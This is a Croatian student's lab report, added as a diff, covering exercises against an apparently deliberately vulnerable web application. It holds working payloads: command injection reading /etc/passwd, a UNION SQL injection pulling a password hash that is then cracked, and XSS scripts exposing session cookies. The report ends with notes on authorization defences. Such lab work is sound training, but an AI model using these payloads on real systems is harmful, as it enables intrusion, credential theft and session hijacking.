@@ -1,0 +1,55 @@
+3.labos iz SRS
+
+1. U izborniku command injection gdje postoji labela za upis IP adrese, unio sam 1 | more etc/passwd i time sam dobio ovaj ispis:
+
+PING 1 (0.0.0.1): 56 data bytes
+::::::::::::::
+/etc/passwd
+::::::::::::::
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+Time je command injection uspješno proveden i dobiven je sadržaj datoteke. Korištena naredba je "1 | more /etc/passwd"
+
+2. Na stranici SQL injection postoji labela koja očekuje da korisnik upiše user ID i prema tome vraća neke podatke, s obzirom da se provodi
+SELECT naredba, odnosno bazi podatka se šalje SELECT. Tu SQL naredbu mijenjamo i nadodajemo sa UNION i dodatnim SQL kodom u kojem manipuliramo zahtjevom
+i dobivamo podatke koji nam nisu originalno dostupni.
+
+Provodimo nardebu : " 'UNION SELECT first_name, password FROM users WHERE last_name ='Picasso "(isključujemo "" to je samo da pokažem string)
+i dobivamo hash lozinke korisnika.
+0d107d09f5bbe40cade3de5c71e9e9b7 (dobiveni hash)
+Nadalje dobiveni hash upisujemo na neki od servisa kao što je: crackstation.net .
+Servis nam vraća da je lozinka "letmein"
+
+3. Ovaj problem sam rjesio koristenjem naredbe > "<script>alert(document.cookie)</script>"
+Navedenu naredbu sam postavio u polje message i u polje ime bilošta. Nakon što sam poslao zahtjev, vraćen mi je alert u kojem
+je bio ispisan sljedeći odlomak > "PHPSESSID=q98btf7ffv05teolu9tb7aidp7; security=low"
+Time sam dobio PHPSESSID. Veličina polja za unos podataka se može mijenjati odnosno povećati mijenjanjem ograničenja veličine u sourcu.
+http://public.tel.fer.hr/srs?cookie=security=low;%20PHPSESSID=q98btf7ffv05teolu9tb7aidp7
+
+Za XSS(REflected) također koristim naredbu > "<script>alert(document.cookie)</script>" i dobivam PHPSESSID.
+PHPSESSID=q98btf7ffv05teolu9tb7aidp7; security=low
+http://192.168.56.101/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E#
+
+4. Ovakvu vrstu napada je moguće provesti jer napadač pokreće funkcije i funkcionalnosti koje mu nisu originalno dostupne i na koje nema pravo,
+razlog zašto je moguće je jer nije implementirana ispravna autorizacija. Jedan od načina zaštite bi bio dopuštanja pristupa samo autentificiranim korisnicima,
+restirktirati funkcije i funkcionalnosti odnosno restriktirati pristup stvarima kojima napadač nema pravo,
+zamijeniti reference s privremenim vrijednostima koje se na poslužitelju preslikavaju u prave.
